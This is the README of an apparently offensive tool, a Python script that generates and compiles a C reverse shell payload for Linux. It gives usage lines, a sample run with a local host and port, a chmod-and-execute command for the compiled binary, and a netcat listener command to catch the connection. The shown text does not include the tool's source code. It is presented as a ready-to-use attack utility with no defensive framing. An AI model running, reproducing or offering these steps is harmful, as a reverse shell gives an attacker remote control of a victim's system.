# Simple C Reverseshell Generator (linux)
```                                         __              ___    ___      
                                            __              ___    ___      
                                           /\ \            /\_ \  /\_ \     
  ___           _ __    __   __  __    ____\ \ \___      __\//\ \ \//\ \    
 /'___\ _______/\`'__\/'__`\/\ \/\ \  /',__\\ \  _ `\  /'__`\\ \ \  \ \ \   
/\ \__//\______\ \ \//\  __/\ \ \_/ |/\__, `\\ \ \ \ \/\  __/ \_\ \_ \_\ \_ 
\ \____\/______/\ \_\\ \____\\ \___/ \/\____/ \ \_\ \_\ \____\/\____\/\____\
 \/____/         \/_/ \/____/ \/__/   \/___/   \/_/\/_/\/____/\/____/\/____/
                                                                            
                                                                            

Usage		:	python3 make-c-revshell.py yourip yourport mode (32-bit or 64-bit) 
     		:	python3 make-c-revshell.py lhost lport mode (mode is either 32/64)

Example   	:	python3 make-c-revshell.py 127.0.0.1 4444 32


[+]  Starting 
[+]  Using LHOST 127.0.0.1
[+]  Using LPORT 4444
[+]  Using MODE 32

[!]  Creating template 32
[*]  Generating template
[*]  Writing results to file /tmp/revshell.c
[+]  Written to file '/tmp/revshell.c' successfully

[!]  Compiling executable
[*]  Compiling the file '/tmp/revshell.c' in 32-bit-mode
[*] Running Command 'gcc -m32 /tmp/revshell.c -o /tmp/reverseshell'
[+] File '/tmp/revshell.c' has been compiled successfully


[+] Run 'chmod +x /tmp/reverseshell;/tmp/reverseshell'

Set up listener using:	 nc -vvlp 4444


```